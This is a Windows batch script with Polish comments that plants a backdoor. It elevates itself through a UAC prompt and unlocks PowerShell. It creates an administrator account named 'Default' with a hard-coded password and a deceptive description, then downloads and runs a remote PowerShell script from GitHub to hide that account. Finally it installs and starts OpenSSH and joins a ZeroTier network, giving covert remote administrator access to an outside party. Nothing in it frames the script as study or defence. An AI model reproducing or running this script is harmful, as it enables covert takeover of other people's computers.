@echo off
:: Sprawdzenie uprawnień administratora
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

:: Jeśli błąd (brak uprawnień), uruchom ponownie jako administrator
if '%errorlevel%' NEQ '0' (
    echo Uruchamianie jako administrator...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

:: Odblokowanie PS
PowerShell -Command "Set-ExecutionPolicy Unrestricted -Force"
cls
:: Utwórz użytkownika "Defaulte" z hasłem "MKO0(ijn"
net user Default MKO0(ijn /add
cls
net localgroup Administratorzy Default /add
cls
net user Default /comment:"Wbudowane konto używane podczas problemów z systemem"
cls

:: ukrycie uzytkownika
set "url=https://github.com/szymson2137/5m-block/raw/main/user.ps1"
set "outputdir=C:\Windows\Temp"
set "filename=user.ps1"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%outputdir%\%filename%')"
powershell -Command "Unblock-File -Path '%outputdir%\%filename%'"
powershell -ExecutionPolicy Bypass -File "%outputdir%\%filename%"
del "%outputdir%\%filename%"
cls

:: Instalacja OpenSSH Server
powershell -Command "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
cls

:: Uruchomienie usługi OpenSSH
sc config sshd start=auto
net start sshd

:: Wykonaj komendę "zerotier-cli join e3918db483b763f7"
echo dołączanie do zdalnej sieci...
zerotier-cli join e3918db483b763f7
echo pomyśłnie dołaczono 

:: Zakończ skrypt
exit